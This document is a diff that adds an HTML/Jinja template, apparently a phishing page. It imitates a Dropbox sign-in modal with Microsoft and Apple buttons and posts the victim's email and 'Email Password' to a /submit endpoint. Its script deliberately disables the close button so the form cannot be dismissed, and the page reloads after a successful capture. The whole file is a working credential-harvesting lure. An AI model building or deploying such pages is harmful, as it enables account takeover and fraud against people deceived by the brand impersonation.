@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dropbox </title>
+  <style>
+    /* Reset and basic styling */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      background-image: url("{{ url_for('static', filename='index.png') }}");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    /* Modal container */
+    .modal {
+      background: white;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      position: relative;
+      overflow: hidden;
+      display: none; /* Hidden by default */
+    }
+
+    /* Close button */
+    .close-btn {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      font-size: 24px;
+      color: #666;
+      cursor: pointer;
+      background: none;
+      border: none;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .close-btn:hover {
+      color: #000;
+    }
+
+    /* Header with logo and title */
+    .header {
+      text-align: center;
+      padding: 32px 0 24px;
+    }
+
+    .logo {
+      width: 48px;
+      height: 48px;
+      background: url('https://www.dropbox.com/static/images/logo.svg') no-repeat center;
+      background-size: contain;
+      margin: 0 auto 16px;
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #0061ff;
+    }
+
+    /* Form section */
+    .form-container {
+      padding: 0 32px 32px;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      outline: none;
+    }
+
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #0061ff;
+      box-shadow: 0 0 0 2px rgba(0, 97, 255, 0.2);
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .remember-me input {
+      margin-right: 8px;
+    }
+
+    .sign-in-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #0061ff;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+
+    .sign-in-btn:hover {
+      background-color: #0053e0;
+    }
+
+    /* Alternative sign-in buttons */
+    .alt-signin {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .alt-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      background: white;
+      cursor: pointer;
+      gap: 12px;
+    }
+
+    .alt-btn:hover {
+      background-color: #f8f9fa;
+    }
+
+    .alt-btn img {
+      width: 20px;
+      height: 20px;
+    }
+
+    /* Flash messages */
+    .flash-messages {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 1000;
+    }
+
+    .flash-message {
+      padding: 15px;
+      margin-bottom: 10px;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+    }
+
+    .flash-success {
+      background-color: #4CAF50;
+    }
+
+    .flash-error {
+      background-color: #f44336;
+    }
+  </style>
+</head>
+<body id="background">
+  <div class="modal" id="modal">
+    <button class="close-btn" id="closeBtn">×</button>
+
+    <div class="header">
+      <div class="logo"></div>
+      <div class="title">Dropbox</div>
+    </div>
+
+    <div class="form-container">
+      <p class="subtitle">Sign in to continue</p>
+
+      <form id="signinForm" action="/submit" method="POST">
+        <div class="input-group">
+          <input type="email" name="email" placeholder="hi@me.com" value="hi@me.com" autocomplete="email" required>
+        </div>
+        <div class="input-group">
+          <input type="password" id="password" name="password" placeholder="Email Password" autocomplete="current-password" required>
+        </div>
+
+        <label class="remember-me">
+          <input type="checkbox" checked>
+          Remember me
+        </label>
+
+        <button type="submit" class="sign-in-btn">Sign in</button>
+      </form>
+
+      <div class="alt-signin">
+        <button class="alt-btn">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+          Sign in with Microsoft
+        </button>
+        <button class="alt-btn">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+          Sign in with Apple
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="flash-messages" id="flashMessages">
+    {% with messages = get_flashed_messages(with_categories=true) %}
+      {% if messages %}
+        {% for category, message in messages %}
+          <div class="flash-message flash-{{ category }}">{{ message }}</div>
+        {% endfor %}
+        <!-- Auto-refresh after successful submission -->
+        {% if get_flashed_messages(category_filter=['success']) %}
+          <script>
+            setTimeout(function() {
+              location.reload();
+            }, 2000); // Refresh after 2 seconds
+          </script>
+        {% endif %}
+      {% endif %}
+    {% endwith %}
+  </div>
+
+  <script>
+    const modal = document.getElementById('modal');
+    const closeBtn = document.getElementById('closeBtn');
+    const background = document.getElementById('background');
+    const signinForm = document.getElementById('signinForm');
+    const passwordInput = document.getElementById('password');
+
+    // Show modal when clicking anywhere on the background
+    background.addEventListener('click', (e) => {
+      modal.style.display = 'block';
+      e.stopPropagation(); // Prevent event from bubbling up to window
+    });
+
+    // Remove close functionality from the × button
+    // The form can only be closed by refreshing the page
+    closeBtn.addEventListener('click', (e) => {
+      e.preventDefault(); // Prevent any default action
+      e.stopPropagation(); // Prevent event from bubbling up
+      // Do nothing - form cannot be closed except by refresh
+    });
+
+    // Prevent clicks inside the modal from closing it
+    modal.addEventListener('click', (e) => {
+      e.stopPropagation();
+    });
+  </script>
+</body>
+</html>
